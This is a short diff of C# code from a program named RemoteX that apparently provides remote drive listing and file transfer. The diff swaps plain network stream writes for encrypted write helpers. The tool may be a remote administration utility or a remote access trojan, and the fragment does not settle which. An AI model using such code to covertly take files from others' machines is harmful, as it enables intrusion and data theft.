@@ -55,7 +55,7 @@ namespace RemoteX
                                 drive_info = drive_info.Substring(0, drive_info.Length - 1); //remove last symbol ';'
                             }
 
-                            G_streamwriter.WriteLine(drive_info);
+                            crypt_WriteLine(drive_info);
                             break;
                         }
 
@@ -101,7 +101,7 @@ namespace RemoteX
                                 drive_info = drive_info.Substring(0, drive_info.Length - 1); //remove last ;
                             }
 
-                            G_streamwriter.WriteLine(drive_info);
+                            crypt_WriteLine(drive_info);
                             break;
                         }
                     case EXPLORER_FILE:
@@ -131,7 +131,7 @@ namespace RemoteX
                         }
                     default:
                         {
-                            G_streamwriter.WriteLine(drive_info);
+                            crypt_WriteLine(drive_info);
                             break;
                         }
 
@@ -178,7 +178,7 @@ namespace RemoteX
                 file_stream.CopyTo(memory_stream);
                 file_stream.Close();
 
-                G_stream.Write(BitConverter.GetBytes(memory_stream.Length), 0, 8);
+                crypt_Write(BitConverter.GetBytes(memory_stream.Length), 0, 8);
 
                 if (memory_stream.Length > 0)
                 {
@@ -190,7 +190,7 @@ namespace RemoteX
                     {
                         try
                         {
-                            G_stream.Write(buffer, 0, bytes_read);
+                            crypt_Write(buffer, 0, bytes_read);
                             Debug.WriteLine("Sending");
 
                         }
@@ -211,7 +211,7 @@ namespace RemoteX
                 long ln = -1;
                 try
                 {
-                    G_stream.Write(BitConverter.GetBytes(ln), 0, 8);
+                    crypt_Write(BitConverter.GetBytes(ln), 0, 8);
                 }
                 catch(Exception e)
                 {
